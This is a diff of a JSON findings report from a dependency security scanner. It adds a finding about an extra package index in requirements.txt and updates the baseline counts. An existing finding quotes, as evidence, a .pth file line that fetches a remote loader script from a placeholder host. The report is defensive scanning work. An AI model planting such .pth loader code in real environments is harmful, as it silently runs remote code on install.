@@ -52,12 +52,26 @@
       "file": "src/evil.pth",
       "evidence": "import urllib.request; urllib.request.urlopen('https://example.invalid/loader.py')",
       "remediation": "Remove unexpected .pth executable code and rebuild the virtual environment from trusted, hashed requirements."
+    },
+    {
+      "id": "risk.pypi.extra-index-url",
+      "title": "Requirements file uses an extra package index",
+      "severity": "low",
+      "status": "existing",
+      "confidence": "high",
+      "ecosystem": "pip",
+      "file": "requirements.txt",
+      "evidence": "--extra-index-url https://test.pypi.org/simple/",
+      "remediation": "Review package index trust boundaries. Remove extra indexes unless required, or isolate private indexes with hash-locked requirements.",
+      "references": [
+        "https://pip.pypa.io/en/stable/cli/pip_install/"
+      ]
     }
   ],
   "baseline": {
     "path": ".depsaber/baseline.json",
     "new": 2,
-    "existing": 2,
+    "existing": 3,
     "resolved": 1,
     "newBySeverity": {
       "critical": 1,
